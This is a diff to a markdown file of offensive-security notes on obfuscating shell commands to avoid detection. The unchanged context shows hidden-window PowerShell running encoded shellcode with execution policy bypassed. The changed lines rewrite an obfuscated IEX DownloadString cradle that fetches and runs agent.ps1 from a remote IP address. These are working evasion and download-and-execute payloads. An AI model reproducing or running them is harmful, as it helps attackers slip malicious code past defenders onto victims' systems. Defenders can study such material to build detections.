@@ -47,7 +47,7 @@ The above string can be obfuscated using the **batch special caracter: ^** <br /
 
       ;cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
-- We can also **pipe** commands to evade detection
+- We can also **pipe** commands to avoid detection
 
       echo "rubish data" | cmd.exe /c powershell.exe -nop -wind hidden -Exec Bypass -noni -enc $shellcode
 
@@ -79,7 +79,7 @@ https://github.com/r00t-3xp10it/hacking-material-books/blob/master/obfuscation/p
 
 - String command to obfuscate<br />
 `whoami`<br />
-The above string can be obfuscated using the **bash special caracters: '** or **\\** or **$@**<br />
+The above string can be obfuscated using **bash special caracters: '** or **\\** or **$@**<br />
 
 - String obfuscated<br />
 
@@ -115,8 +115,8 @@ The above string can be obfuscated using **powershell special caracters:** **`**
 
 - String obfuscated<br />
 
-      $get = New-Object "N`et`Web`Cl`ie`nt"
-      p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168.1.71/agent.ps1')
+      $get="New-Ob'+'je'+'ct N'+'etW'+'ebCl'+'ient"
+      p`owe`r`she`l`l.exe `IE`X ($get).D`ow`n`loa`dSt`rin`g('h'+'t'+'tp'+':'+'//'+'192.168'+'.1.71/agent.ps1')
 
 - Using **powershell special caracters: '** and **+**
 
